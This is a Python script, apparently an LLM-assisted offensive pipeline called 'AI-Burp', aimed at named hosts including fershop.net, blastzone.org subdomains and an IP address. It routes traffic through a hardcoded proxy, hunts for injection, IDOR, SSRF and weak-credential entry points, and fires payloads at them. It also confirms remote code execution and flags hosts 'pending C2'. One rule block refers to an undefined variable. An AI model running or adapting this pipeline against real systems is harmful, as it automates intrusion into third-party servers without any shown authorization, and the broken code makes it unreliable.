"""
AI-Burp 完整四阶段 Pipeline (V4)

严格遵循 aiburp/prompts/pipeline.py 中定义的 4 阶段流程:

  Phase ① 打点   - 资产收集 (CrawlerEngine 等)
  Phase ② 流量化 - 把资产全部发正常 GET, 写入 TrafficJournal
  Phase ③ LLM 分析 - 读 TrafficJournal 找突破口 (LLM 不可用时规则 fallback)
  Phase ④ 精准验证 - 发 payload 验证突破口, TriageGate Q1+Q3 门控

对两个目标执行:
  - fershop.net
  - blastzone (webmail.blastzone.org / bzhost1.blastzone.org / 216.215.30.39 等可达资产)

输出: .pipeline_output/{target}_{phase}_*.{json,txt}
"""
import sys, time, json, asyncio, re, os
from pathlib import Path
from typing import Dict, List, Optional
from urllib.parse import urlparse, parse_qs

sys.path.insert(0, str(Path(__file__).parent))
import requests
import urllib3
urllib3.disable_warnings()

OUT_DIR = Path(".pipeline_output")
OUT_DIR.mkdir(exist_ok=True)

PROXY = "http://3.211.120.181:443"
PROXIES_FERSHOP = {"http": PROXY, "https": PROXY}   # 用户要求 fershop 全走代理
PROXIES_BLASTZONE = {"http": PROXY, "https": PROXY}  # blastzone 报告里都走代理
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}


def log(msg):
    t = time.strftime("%H:%M:%S")
    print(f"[{t}] {msg}", flush=True)


def section(title):
    print()
    log("=" * 70)
    log(title)
    log("=" * 70)


# ============================================================
# Phase ①: 资产收集 — 加载已有 inventory, 必要时扩展
# ============================================================
def phase1_load_inventory(target: str, inventory_file: str = None) -> List[str]:
    """
    加载 Phase ① 资产清单, 优先复用已跑过的 inventory。
    """
    if inventory_file and Path(inventory_file).exists():
        with open(inventory_file, encoding="utf-8") as f:
            items = json.load(f)
        urls = sorted({it["value"] for it in items if it.get("type") == "url"})
        log(f"从 {inventory_file} 加载 {len(urls)} URL")
        return urls

    # 没有 inventory 则用种子
    seeds = [target] if target.startswith("http") else [f"https://{target}"]
    log(f"使用种子 URL: {seeds}")
    return seeds


def phase1_blastzone_assets() -> List[str]:
    """blastzone 的资产清单 — 从可达性测试结果拼出"""
    reach_file = OUT_DIR / "blastzone_reachability.json"
    if not reach_file.exists():
        log(f"⚠️ {reach_file} 不存在, 先运行 check_blastzone_reachability.py")
        return []
    with open(reach_file) as f:
        reach = json.load(f)
    urls = []
    for r in reach:
        d, p = r["direct"], r["proxy"]
        # 优先用直连可达的; 若只有代理可达则用代理
        if isinstance(d["status"], int) and 200 <= d["status"] < 400:
            urls.append(r["url"])
        elif isinstance(p["status"], int) and 200 <= p["status"] < 400:
            urls.append(r["url"])
    # 加上报告里提到的高价值路径
    extra = [
        "http://webmail.blastzone.org/?_task=login",
        "http://bzhost1.blastzone.org/phpmyadmin/",
        "http://bzhost1.blastzone.org/phpmyadmin/index.php",
        "http://216.215.30.39/phpmyadmin/",
        "http://216.215.30.39/",
        "http://216.215.30.39/index.php",
        "http://216.215.30.39/admin/",
        "http://216.215.30.39/wp-login.php",
    ]
    for u in extra:
        if u not in urls:
            urls.append(u)
    log(f"blastzone 资产 (含可达性筛选 + 高价值路径): {len(urls)}")
    return urls


# ============================================================
# Phase ②: 流量化 — 对每个资产发正常 GET 请求, 写入 TrafficJournal
# ============================================================
def phase2_trafficify(urls: List[str], target: str, proxies: dict,
                      batch_size: int = 50, delay: float = 0.05,
                      body_limit: int = 2000, force: bool = False) -> List[Dict]:
    """
    对每个 URL 发正常 GET 请求, 记录响应详情.
    返回 traffic entries 列表.
    """
    journal_file = OUT_DIR / f"{target.replace('.', '_')}_traffic_journal.json"
    if journal_file.exists() and not force:
        with open(journal_file) as f:
            entries = json.load(f)
        log(f"复用 TrafficJournal: {len(entries)} 条 (设 force=True 重跑)")
        return entries

    entries = []
    session = requests.Session()
    session.trust_env = False
    session.verify = False
    session.headers.update(HEADERS)
    if proxies:
        session.proxies.update(proxies)

    t0 = time.time()
    total = len(urls)
    log(f"开始流量化 {total} URL (proxy={proxies is not None})")

    for i, url in enumerate(urls, 1):
        entry = {
            "url": url,
            "method": "GET",
            "status": 0,
            "length": 0,
            "headers": {},
            "body_preview": "",
            "params": {},
            "tags": [],
            "errors": [],
            "elapsed_ms": 0,
            "ok": False,
        }
        # 解析 URL 参数
        try:
            p = urlparse(url)
            entry["params"] = {k: v[0] if v else "" for k, v in parse_qs(p.query).items()}
        except Exception:
            pass

        try:
            t_req = time.time()
            r = session.get(url, timeout=10, allow_redirects=True)
            entry["elapsed_ms"] = round((time.time() - t_req) * 1000, 1)
            entry["status"] = r.status_code
            entry["length"] = len(r.content)
            entry["headers"] = {k: v for k, v in r.headers.items()
                                if k.lower() in ("server", "content-type", "x-powered-by",
                                                 "set-cookie", "location", "x-frame-options",
                                                 "content-security-policy", "strict-transport-security")}
            entry["body_preview"] = r.text[:body_limit]
            entry["ok"] = r.status_code < 400

            # 启发式标记
            body_lower = entry["body_preview"].lower()
            tags = []
            if "phpmyadmin" in body_lower or "pma_" in body_lower:
                tags.append("phpmyadmin")
            if "roundcube" in body_lower or "_task=login" in url:
                tags.append("roundcube")
            if "wordpress" in body_lower or "wp-login" in url or "wp-content" in body_lower:
                tags.append("wordpress")
            if "shopify" in body_lower:
                tags.append("shopify")
            if r.headers.get("Server", ""):
                tags.append(f"server:{r.headers['Server'].lower()}")
            if r.headers.get("X-Powered-By"):
                tags.append(f"powered:{r.headers['X-Powered-By'].lower()}")
            entry["tags"] = tags

            # 错误信号
            err_signals = []
            for kw in ("SQL syntax", "ORA-", "PostgreSQL", "MySQL", "Warning:", "Fatal error",
                      "Traceback", "Exception", "Stack trace"):
                if kw in entry["body_preview"]:
                    err_signals.append(f"db_or_php_error:{kw}")
            for kw in ("DEBUG", "verbose", "stack trace", "internal"):
                if kw.lower() in body_lower:
                    err_signals.append(f"verbose_signal:{kw}")
            entry["errors"] = err_signals[:5]

        except Exception as e:
            entry["errors"].append(f"request_failed:{str(e)[:60]}")

        entries.append(entry)

        if i % batch_size == 0 or i == total:
            elapsed = time.time() - t0
            rate = i / elapsed if elapsed > 0 else 0
            ok_count = sum(1 for e in entries if e["ok"])
            log(f"  [{i}/{total}] ok={ok_count} elapsed={elapsed:.0f}s rate={rate:.1f}/s")

        if delay > 0:
            time.sleep(delay)

    session.close()

    with open(journal_file, "w", encoding="utf-8") as f:
        json.dump(entries, f, indent=2, ensure_ascii=False)
    log(f"TrafficJournal -> {journal_file} ({len(entries)} 条)")
    return entries


# ============================================================
# Phase ③: LLM 分析 — 读 TrafficJournal 找突破口
# 不可用时 fallback: 规则引擎 + 模式匹配
# ============================================================
def phase3_llm_analyze(entries: List[Dict], target: str,
                       scope_domains: List[str],
                       enriched_urls: Optional[List[str]] = None,
                       llm_chain=None) -> List[Dict]:
    """
    返回突破口列表: [{"type", "target", "confidence", "payload_category", "reason", "evidence"}]

    Args:
        entries: TrafficJournal entries
        target: 目标域名
        scope_domains: scope 域名列表
        enriched_urls: 深度挖掘产出的 high 清单 (Phase ②.5)
        llm_chain: LLMChain 实例 (统一从外层传入)
    """
    # 1. 先尝试规则引擎 (即使 LLM 不可用也能产出突破口)
    breakthroughs = phase3_rule_based(entries, scope_domains)

    # 1.5 注入深度挖掘的高优先级候选 (插队到列表头部)
    if enriched_urls:
        injected = 0
        seen = {(b["target"], b["type"]) for b in breakthroughs}
        for u in enriched_urls:
            t = (u, "deep_mining_high")
            if t in seen:
                continue
            seen.add(t)
            breakthroughs.insert(0, {
                "type": "deep_mining_high",
                "target": u,
                "confidence": "high",
                "payload_category": _infer_category(u),
                "reason": "[DeepMining] Phase ②.5 LLM 决策的 high 清单",
                "evidence": "from deep_mining/mining_loop.py",
                "source": "deep_mining",
            })
            injected += 1
        log(f"[DeepMining] 注入 {injected} 条 high 清单到 Phase ③ 队列头部")

    # 2. 尝试 LLM 增强 (如果有 API key)
    try:
        llm_bts = phase3_llm_enhance(entries, target, scope_domains, llm_chain)
        # 去重合并: 按 target + type 合并
        seen = {(b["target"], b["type"]) for b in breakthroughs}
        for bt in llm_bts:
            key = (bt["target"], bt["type"])
            if key not in seen:
                breakthroughs.append(bt)
                seen.add(key)
        log(f"LLM 增强后共 {len(breakthroughs)} 个突破口")
    except Exception as e:
        log(f"⚠️ LLM 不可用 ({str(e)[:80]}), 仅规则引擎结果: {len(breakthroughs)} 个")

    return breakthroughs


def _infer_category(url: str) -> str:
    """根据 URL 推断 payload_category, 深度挖掘的高优 URL 也走 Phase ④."""
    u = url.lower()
    if any(kw in u for kw in ("/login", "/auth", "/session")):
        return "weak_creds"
    if "/api/" in u or u.endswith("/api"):
        return "api_misconfig"
    if any(kw in u for kw in ("/admin", "/internal", "/private")):
        return "auth_bypass"
    if any(kw in u for kw in ("/upload", "multipart")):
        return "file_upload"
    if "?" in u and any(p in u for p in ("?id=", "?user_id=", "?uid=", "?pid=")):
        return "idor_numeric"
    if "?" in u and any(p in u for p in ("?url=", "?redirect=", "?callback=")):
        return "open_redirect"
    return "general"


def phase3_rule_based(entries: List[Dict], scope_domains: List[str]) -> List[Dict]:
    """
    基于规则的突破口发现 (LLM 不可用时的主方案)
    信号:
      - URL 含数字 ID (/catalog/product/28)
      - URL 含参数 (?id=, ?user=, ?file=, ?url=, ?redirect=, ?callback=)
      - 响应回显了参数值 (XSS)
      - 路径含可疑关键词 (admin, login, upload, api, phpmyadmin)
      - 错误信号 (db 报错, stack trace)
    """
    bts = []

    # 收集所有 URL
    seen_targets = set()  # 去重

    for e in entries:
        url = e["url"]
        if not e.get("ok"):
            continue

        body = e.get("body_preview", "")
        params = e.get("params", {})

        # === 数字 ID 路径 → IDOR / SQLi ===
        path_ids = re.findall(r'/(\d{1,6})(?:/|$|\?)', urlparse(url).path)
        for pid in path_ids[:3]:
            # IDOR
            t = (url, "idor")
            if t in seen_targets:
                continue
            seen_targets.add(t)
            bts.append({
                "type": "idor",
                "target": url,
                "confidence": "medium",
                "payload_category": "idor_numeric",
                "reason": f"路径含数字 ID ({pid}), 可尝试 ±1 访问其他用户资源",
                "evidence": f"path_id={pid}, status={e['status']}",
                "source": "rule_path_id",
            })

        # === URL 参数 → XSS / SQLi / SSRF / Open Redirect ===
        for pname, pval in params.items():
            pname_lower = pname.lower()
            # 反射型 XSS — 参数值在 body 中回显
            if pval and pval in body and len(pval) >= 3:
                t = (url, "xss")
                if t in seen_targets:
                    continue
                seen_targets.add(t)
                bts.append({
                    "type": "xss",
                    "target": url,
                    "confidence": "high" if pval in body else "medium",
                    "payload_category": "xss_reflected",
                    "reason": f"参数 {pname}={pval[:30]} 回显到响应体, 可注入 XSS payload",
                    "evidence": f"param={pname}, reflected=true",
                    "source": "rule_reflected_param",
                })

            # SQLi 怀疑 — 参数名含 id/user/order
            if pname_lower in ("id", "user_id", "order_id", "uid", "pid", "product_id",
                              "user", "order", "cat", "category", "page", "sort", "limit"):
                t = (url, "sqli")
                if t in seen_targets:
                    continue
                seen_targets.add(t)
                bts.append({
                    "type": "sqli",
                    "target": url,
                    "confidence": "medium",
                    "payload_category": "sqli_error",
                    "reason": f"参数 {pname} 接受用户输入, 测试 SQL 注入",
                    "evidence": f"param={pname}, value={pval[:30]}",
                    "source": "rule_numeric_param",
                })

            # SSRF 怀疑 — 参数名含 url/uri/site/host/redirect/callback
            if pname_lower in ("url", "uri", "site", "host", "domain", "redirect",
                              "redirect_uri", "callback", "next", "return", "feed",
                              "imageurl", "source"):
                t = (url, "ssrf")
                if t in seen_targets:
                    continue
                seen_targets.add(t)
                bts.append({
                    "type": "ssrf",
                    "target": url,
                    "confidence": "medium",
                    "payload_category": "ssrf_basic",
                    "reason": f"参数 {pname} 可能是 URL 输入, 测试 SSRF (file:/// metadata)",
                    "evidence": f"param={pname}, value={pval[:40]}",
                    "source": "rule_url_param",
                })

            # Open Redirect 怀疑
            if pname_lower in ("redirect", "redirect_uri", "url", "next", "return",
                              "goto", "returnurl", "return_url"):
                t = (url, "open_redirect")
                if t in seen_targets:
                    continue
                seen_targets.add(t)
                bts.append({
                    "type": "open_redirect",
                    "target": url,
                    "confidence": "medium",
                    "payload_category": "open_redirect",
                    "reason": f"参数 {pname} 可能控制重定向, 测试开放重定向",
                    "evidence": f"param={pname}",
                    "source": "rule_redirect_param",
                })

        # === 路径 ID → 路径型 IDOR (改路径最后一段数字) ===
        m = re.search(r'(.*?)(\d+)(/?)$', url.rstrip('/'))
        if m:
            t = (url, "idor_path")
            if t not in seen_targets:
                seen_targets.add(t)
                bts.append({
                    "type": "idor_path",
                    "target": url,
                    "confidence": "high" if status == 200 else "medium",
                    "payload_category": "idor",
                    "reason": f"URL 末尾数字可作为 ID, 测试路径型 IDOR (改值后访问控制)",
                    "evidence": f"path_id={m.group(2)}, status={status}",
                    "source": "rule_path_id",
                })

        # === 路径关键词 → 文件上传 / API ===
        path_lower = urlparse(url).path.lower()
        if "/upload" in path_lower or "multipart" in body.lower():
            t = (url, "file_upload")
            if t not in seen_targets:
                seen_targets.add(t)
                bts.append({
                    "type": "file_upload",
                    "target": url,
                    "confidence": "medium",
                    "payload_category": "file_upload",
                    "reason": f"路径含 upload, 测试文件上传绕过",
                    "evidence": f"path={path_lower}",
                    "source": "rule_upload_path",
                })

        if "/api/" in path_lower or path_lower.endswith("/api"):
            t = (url, "api_misconfig")
            if t not in seen_targets:
                seen_targets.add(t)
                bts.append({
                    "type": "api_misconfig",
                    "target": url,
                    "confidence": "low",
                    "payload_category": "api_misconfig",
                    "reason": f"API 端点, 测试速率限制/权限校验/CORS",
                    "evidence": f"path={path_lower}",
                    "source": "rule_api_path",
                })

        # === 错误信号 → SQLi / 报错注入 ===
        for err in e.get("errors", []):
            if "db_or_php_error" in err:
                t = (url, "sqli")
                if t not in seen_targets:
                    seen_targets.add(t)
                    bts.append({
                        "type": "sqli",
                        "target": url,
                        "confidence": "high",
                        "payload_category": "sqli_error",
                        "reason": f"响应中检测到 DB/PHP 错误信号: {err}",
                        "evidence": err,
                        "source": "rule_error_signal",
                    })

    log(f"规则引擎发现 {len(bts)} 个候选突破口")
    return bts


def phase3_llm_enhance(entries: List[Dict], target: str,
                       scope_domains: List[str],
                       llm_chain=None) -> List[Dict]:
    """调用 LLM 分析 TrafficJournal (有 API key 时使用)"""
    import os
    if not (os.getenv("OPENAI_API_KEY") or os.getenv("ANTHROPIC_API_KEY")):
        raise RuntimeError("no LLM API key")

    from aiburp.prompts.pipeline import LLM_JOURNAL_ANALYSIS_PROMPT

    # 摘要流量日志 (节省 token)
    summary_lines = []
    for e in entries[:200]:
        if not e.get("ok"):
            continue
        params_str = ",".join(f"{k}={v[:20]}" for k, v in e.get("params", {}).items())
        params_str = params_str[:60]
        tags = ",".join(e.get("tags", [])[:3])
        summary_lines.append(
            f"[{e['status']}] {e['method']} {e['url'][:100]} "
            f"len={e['length']} params=[{params_str}] tags=[{tags}]"
        )
    journal_text = "\n".join(summary_lines[:150])

    prompt = LLM_JOURNAL_ANALYSIS_PROMPT.replace(
        "{journal}",  # 如果 prompt 里没占位符也无所谓
        journal_text
    )
    # 兼容 prompt 中没有占位符的情况
    if "{journal}" not in LLM_JOURNAL_ANALYSIS_PROMPT:
        prompt = f"{LLM_JOURNAL_ANALYSIS_PROMPT}\n\n## 流量日志\n{journal_text}"

    # 优先用 LLMChain (主→备→兜底), 没有再回退 LLMClient
    if llm_chain is not None:
        result = llm_chain.ask(prompt)
        response = result.get("response", "")
        log(f"LLMChain 响应 ({len(response)} chars, model={result.get('model')})")
    else:
        from aiburp.agent import LLMClient
        client = LLMClient()
        response = client.ask(prompt)
        log(f"LLMClient 响应 ({len(response)} chars)")

    # 解析 JSON
    m = re.search(r'```json\s*(.*?)\s*```', response, re.DOTALL) or re.search(r'(\{.*\})', response, re.DOTALL)
    if not m:
        return []
    data = json.loads(m.group(1))
    bts = data.get("breakthroughs", []) if isinstance(data, dict) else data
    if not isinstance(bts, list):
        return []
    log(f"LLM 解析到 {len(bts)} 个突破口")
    return bts


# ============================================================
# Phase ④: 精准验证 — 发 payload + TriageGate
# ============================================================
def phase4_verify(breakthroughs: List[Dict], target: str,
                  scope_domains: List[str], proxies: dict) -> List[Dict]:
    """
    对每个突破口:
      1. 过 TriageGate (Q1+Q3)
      2. 通过的发 payload 验证
      3. RCE 候选走专用路径 (只确认能力, 不建 C2)
    """
    from aiburp.triage import TriageGate
    from aiburp.payloads.by_breakthrough import get_vuln_types

    session = requests.Session()
    session.trust_env = False
    session.verify = False
    session.headers.update(HEADERS)
    if proxies:
        session.proxies.update(proxies)

    verified = []
    for i, bt in enumerate(breakthroughs, 1):
        # 1. 门控
        gate = TriageGate(target=target, finding=bt, scope_domains=scope_domains)
        gate_result = gate.run()
        bt["gate"] = gate_result

        if not gate_result["pass"]:
            log(f"  [{i}/{len(breakthroughs)}] ❌ 门控拒绝: {bt['type']} {bt['target'][:60]}")
            continue

        log(f"  [{i}/{len(breakthroughs)}] ✅ 门控通过: {bt['type']} {bt['target'][:60]}")

        # 2. 选 payload
        category = bt.get("payload_category", "")
        vuln_types = get_vuln_types(category)
        if not vuln_types:
            # 没有对应 injector 的, 走专用验证 (暂时只记录)
            bt["verify_status"] = "manual_required"
            bt["verify_reason"] = f"无 injector 对应 category={category}, 需手工验证"
            verified.append(bt)
            continue

        # 3. RCE 候选走专用路径 (只确认能力)
        try:
            from aiburp.rce.confirm import RCEConfirm
            confirmer = RCEConfirm()
            if confirmer.is_rce_potential(bt["target"]):
                log(f"    🎯 RCE 候选, 走能力确认路径: {bt['target'][:70]}")
                from urllib.parse import urlparse, parse_qs
                params = {k: v[0] if v else "" for k, v in
                          parse_qs(urlparse(bt["target"]).query).items()}
                rce_result = confirmer.confirm(
                    session, bt["target"], params,
                    os_hint=bt.get("os_hint", "linux"),
                    collaborator=os.getenv("OOB_COLLABORATOR"),
                )
                bt["verify_status"] = rce_result["status"]
                bt["rce_evidence"] = rce_result
                log(f"    → {rce_result['status']} (method={rce_result['method']})")
                if rce_result["confirmed"]:
                    log(f"    ⏸️  RCE 能力确认成功, 等待用户拍板是否上 C2")
                verified.append(bt)
                continue
        except Exception as e:
            log(f"    ⚠️ RCE 检测异常, fallback 到普通验证: {str(e)[:60]}")

        # 4. 发 payload (用 MultiChannelInjector)
        try:
            from aiburp.traffic.injector import MultiChannelInjector, scan_path_idor
            injector = MultiChannelInjector(session, timeout=8, delay=0.2)
            report = injector.scan_all(bt["target"], vuln_types=vuln_types)
            findings = [f.to_dict() if hasattr(f, "to_dict") else f for f in report.findings]

            # 路径型 IDOR 额外跑 scan_path_idor (从 /product/123 → /product/0, -1, 9999 等)
            idor_path_findings = []
            if bt.get("type") == "idor_path":
                idor_path_findings = scan_path_idor(session, bt["target"])
                findings.extend([f.to_dict() if hasattr(f, "to_dict") else f
                                 for f in idor_path_findings])

            confirmed = any(f.get("confidence") == "confirmed" for f in findings)
            bt["verify_status"] = "confirmed" if confirmed else "tested_no_hit"
            bt["verify_findings"] = findings
            log(f"    → {bt['verify_status']} (findings={len(findings)}, "
                f"path_idor={len(idor_path_findings)})")
        except Exception as e:
            bt["verify_status"] = "verify_error"
            bt["verify_reason"] = str(e)[:100]
            log(f"    → verify_error: {str(e)[:60]}")

        verified.append(bt)

    session.close()
    return verified


# ============================================================
# Pipeline 主入口
# ============================================================
def run_target(target: str, urls: List[str], scope_domains: List[str],
               proxies: Optional[dict] = None, force_trafficify: bool = False,
               enable_deep_mining: bool = True):
    """对一个目标跑完整 4 阶段 + 可选 Phase ②.5 深度挖掘"""
    section(f"PIPELINE: {target}")

    # === 全局 LLMChain (主 → 备 → 兜底) ===
    llm_chain = None
    if os.getenv("OPENAI_API_KEY") or os.getenv("ANTHROPIC_API_KEY"):
        from aiburp.agent_llm_chain_compat import LLMChain
        llm_chain = LLMChain()
        log(f"[LLMChain] 启用: {llm_chain}")
    else:
        log("[LLMChain] 未配置 API key, LLM 链路不可用")

    # === Fail-Fast: Phase ②.5 启动前预检 LLM ===
    # 若启用深度挖掘但 LLM 不可用, 必须中止整个 pipeline
    # 不允许静默降级到无 LLM 模式 (用户要求的安全冗余设计)
    if enable_deep_mining:
        if llm_chain is None:
            log("[FATAL] Phase ②.5 需要 LLM, 但未配置 API key — 中止 pipeline")
            raise RuntimeError(
                f"[{target}] LLM 是 Phase ②.5 的硬依赖, "
                f"未配置 OPENAI_API_KEY/ANTHROPIC_API_KEY, 中止整个 pipeline. "
                f"如确认不需要深度挖掘, 请设 enable_deep_mining=False."
            )
        try:
            log("[Pre-flight] 启动 Phase ②.5 前预检 LLM...")
            llm_chain.assert_available()
            log("[Pre-flight] LLM 健康检查通过, 进入 Phase ②.5")
        except Exception as e:
            log(f"[FATAL] LLM 健康检查失败 — 中止 pipeline: {e}")
            raise

    # Phase ①
    section("Phase ①: 资产收集 (加载已有 inventory)")
    log(f"资产数: {len(urls)}")

    # Phase ②
    section("Phase ②: 流量化 (全量 URL → TrafficJournal)")
    entries = phase2_trafficify(urls, target, proxies, force=force_trafficify)
    log(f"流量化完成: {len(entries)} 条")

    # Phase ②.5 (深度挖掘 + LLM 决策中枢)
    enriched_high_list = []
    if enable_deep_mining:
        # 走到这里说明 LLM 已经预检通过, 深度挖掘内部若再失败也会 raise
        try:
            from aiburp.deep_mining import DeepMiningLoop, SessionManager
            section("Phase ②.5: 深度挖掘 (Layer 1.5-7 + LLM 决策 3 轮)")
            sm = SessionManager()
            miner = DeepMiningLoop(
                target=target, session_manager=sm,
                llm_chain=llm_chain, proxy=proxies,
                traffic_entries=entries,
            )
            deep_result = miner.run(initial_candidates=urls)
            enriched_high_list = deep_result.get("final_high_list", [])
            log(f"[DeepMining] 收敛于 round {deep_result['rounds_run']}, "
                f"high 清单 {len(enriched_high_list)} 条")
            log(f"[DeepMining] 新挖出 assets {len(deep_result.get('new_assets', []))} 条")
            if llm_chain:
                log(f"[LLMChain] 使用统计: {llm_chain.report()}")

            dm_file = OUT_DIR / f"{target.replace('.', '_').replace('://', '_')}_deep_mining.json"
            with open(dm_file, "w", encoding="utf-8") as f:
                json.dump(deep_result, f, indent=2, ensure_ascii=False)
            log(f"深度挖掘结果 -> {dm_file}")
        except Exception as e:
            # Fail-Fast: 不再 fallback 到基础流程, 直接向上传播
            log(f"[FATAL] Phase ②.5 中途失败 — 中止 pipeline: {str(e)[:200]}")
            raise

    # Phase ③
    section("Phase ③: LLM 分析 (规则 + DeepMining + LLM 增强)")
    breakthroughs = phase3_llm_analyze(
        entries, target, scope_domains,
        enriched_urls=enriched_high_list,
        llm_chain=llm_chain,
    )

    bt_file = OUT_DIR / f"{target.replace('.', '_').replace('://', '_')}_breakthroughs.json"
    with open(bt_file, "w", encoding="utf-8") as f:
        json.dump(breakthroughs, f, indent=2, ensure_ascii=False)
    log(f"突破口列表 -> {bt_file}")

    # Phase ④
    section("Phase ④: 精准验证 (TriageGate + payload + RCE 能力确认)")
    verified = phase4_verify(breakthroughs, target, scope_domains, proxies)

    v_file = OUT_DIR / f"{target.replace('.', '_').replace('://', '_')}_verified.json"
    with open(v_file, "w", encoding="utf-8") as f:
        json.dump(verified, f, indent=2, ensure_ascii=False)
    log(f"验证结果 -> {v_file}")

    # 汇总
    confirmed = [v for v in verified if v.get("verify_status") == "confirmed"]
    rce_pending = [v for v in verified
                   if v.get("verify_status") == "rce_confirmed_pending_c2"]
    passed_gate = [v for v in verified if v.get("gate", {}).get("pass")]
    rejected_gate = [v for v in verified if not v.get("gate", {}).get("pass")]

    log("")
    log(f"📊 {target} 流水线结果:")
    log(f"  Phase ① 资产数: {len(urls)}")
    log(f"  Phase ② 流量条数: {len(entries)}")
    if enable_deep_mining:
        log(f"  Phase ②.5 深度挖掘 high: {len(enriched_high_list)}")
    log(f"  Phase ③ 突破口: {len(breakthroughs)}")
    log(f"  Phase ④ 门控通过: {len(passed_gate)} | 门控拒绝: {len(rejected_gate)}")
    log(f"  Phase ④ ✅ confirmed: {len(confirmed)}")
    if rce_pending:
        log(f"  Phase ④ 🎯 RCE 能力确认 (待拍板): {len(rce_pending)}")
        for r in rce_pending:
            log(f"    {r['target'][:70]}  method={r.get('rce_evidence', {}).get('method')}")

    return {
        "target": target,
        "phase1_count": len(urls),
        "phase2_count": len(entries),
        "phase25_high_count": len(enriched_high_list) if enable_deep_mining else 0,
        "phase3_breakthroughs": len(breakthroughs),
        "phase4_gate_pass": len(passed_gate),
        "phase4_gate_reject": len(rejected_gate),
        "phase4_confirmed": len(confirmed),
        "phase4_rce_pending": len(rce_pending),
        "confirmed_list": [{"type": v["type"], "target": v["target"],
                            "category": v.get("payload_category")} for v in confirmed],
        "rce_pending_list": [{"target": r["target"],
                                "method": r.get("rce_evidence", {}).get("method")}
                                for r in rce_pending],
    }


def main():
    section("AI-BURP 4-PHASE PIPELINE")

    summary = {}

    # === fershop.net ===
    fershop_urls = phase1_load_inventory(
        "fershop.net",
        inventory_file=".pipeline_output/fershop_inventory.json"
    )
    fershop_result = run_target(
        target="fershop.net",
        urls=fershop_urls,
        scope_domains=["fershop.net"],
        proxies=PROXIES_FERSHOP,   # 全走代理 (用户要求)
        force_trafficify=False,
    )
    summary["fershop.net"] = fershop_result

    # === blastzone ===
    blastzone_urls = phase1_blastzone_assets()
    if blastzone_urls:
        blastzone_result = run_target(
            target="blastzone",
            urls=blastzone_urls,
            scope_domains=["blastzone.org", "bzhost1.com", "bzhost1.blastzone.org",
                          "ashleywestmark.com", "216.215.30.39", "webmail.blastzone.org"],
            proxies=PROXIES_BLASTZONE,
            force_trafficify=False,
        )
        summary["blastzone"] = blastzone_result

    # === 总报告 ===
    summary_file = OUT_DIR / "pipeline_v4_summary.json"
    with open(summary_file, "w", encoding="utf-8") as f:
        json.dump(summary, f, indent=2, ensure_ascii=False)
    log(f"\n总报告 -> {summary_file}")

    section("🎯 总体结果")
    for t, r in summary.items():
        log(f"\n{t}:")
        log(f"  Phase ①: {r['phase1_count']} 资产")
        log(f"  Phase ②: {r['phase2_count']} 流量条目")
        log(f"  Phase ③: {r['phase3_breakthroughs']} 突破口")
        log(f"  Phase ④: {r['phase4_confirmed']} confirmed / "
            f"{r['phase4_gate_pass']} 通过门控")
        if r["confirmed_list"]:
            for c in r["confirmed_list"][:10]:
                log(f"    ✅ {c['type']:15s} {c['target'][:70]}")


if __name__ == "__main__":
    main()
